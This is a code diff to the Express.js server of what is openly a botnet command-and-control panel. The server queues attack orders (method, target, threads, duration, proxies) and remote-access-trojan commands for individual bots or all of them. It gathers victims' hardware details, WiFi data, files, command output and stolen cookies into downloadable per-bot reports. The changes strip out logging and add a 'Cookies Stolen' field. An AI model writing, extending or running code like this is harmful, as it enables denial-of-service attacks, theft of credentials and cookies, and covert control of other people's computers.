@@ -62,7 +62,6 @@ app.post('/api/report', (req, res) => {
 
 app.post('/api/reportinfo', (req, res) => {
     const { id, cpu, ram, gpu, cookies, browsers } = req.body;
-    console.log('ReportInfo from:', id, 'CPU:', cpu, 'RAM:', ram);
     if (bots[id]) {
         bots[id].cpu = parseInt(cpu) || 0;
         bots[id].ram = parseInt(ram) || 0;
@@ -86,7 +85,6 @@ app.post('/api/attack', (req, res) => {
     const cmd = { action: 'attack', method, target, threads: parseInt(threads)||100, duration: parseInt(duration)||60, proxyFile: proxyFile||'' };
     if (botId === 'ALL') pendingCommands['ALL'] = cmd;
     else if (botId) pendingCommands[botId] = cmd;
-    console.log('Attack:', botId, method, target);
     res.json({ ok: true });
 });
 
@@ -102,7 +100,6 @@ app.post('/api/getinfo', (req, res) => {
     const cmd = { action: 'getinfo' };
     if (botId === 'ALL') pendingCommands['ALL'] = cmd;
     else if (botId) pendingCommands[botId] = cmd;
-    console.log('GetInfo:', botId);
     res.json({ ok: true });
 });
 
@@ -111,7 +108,6 @@ app.get('/api/downloadinfo/:id', (req, res) => {
     const bot = bots[id];
     const info = infoData[id] || {};
     if (!bot) return res.status(404).send('Bot not found');
-    
     let txt = '========================================\n';
     txt += '    BOT INFORMATION REPORT\n';
     txt += '========================================\n\n';
@@ -133,10 +129,10 @@ app.get('/api/downloadinfo/:id', (req, res) => {
     txt += 'WiFi:          ' + (info.rat_wifi||'N/A') + '\n';
     txt += 'Files:         ' + (info.rat_files||'N/A') + '\n';
     txt += 'System Info:   ' + (info.rat_sysinfo||'N/A') + '\n';
-    txt += 'CMD Result:    ' + (info.rat_cmd_result||'N/A') + '\n\n';
+    txt += 'CMD Result:    ' + (info.rat_cmd_result||'N/A') + '\n';
+    txt += 'Cookies Stolen:' + (info.rat_cookies||'N/A') + '\n\n';
     txt += '--- TIMESTAMP ---\n';
     txt += 'Report Time:   ' + (info.time||'N/A') + '\n';
-    
     res.setHeader('Content-Type', 'text/plain');
     res.setHeader('Content-Disposition', 'attachment; filename=bot_' + (bot.hostname||'unknown') + '.txt');
     res.send(txt);
@@ -147,13 +143,11 @@ app.post('/api/rat', (req, res) => {
     const cmd = { action: 'rat', ratAction: action, params: params || '' };
     if (botId === 'ALL') pendingCommands['ALL'] = cmd;
     else if (botId) pendingCommands[botId] = cmd;
-    console.log('RAT command:', botId, action);
     res.json({ ok: true });
 });
 
 app.post('/api/ratdata', (req, res) => {
     const { id, type, data } = req.body;
-    console.log('RAT data from:', id, 'type:', type, 'len:', data?data.length:0);
     if (!infoData[id]) infoData[id] = {};
     infoData[id]['rat_' + type] = data || '';
     infoData[id].time = new Date().toISOString();
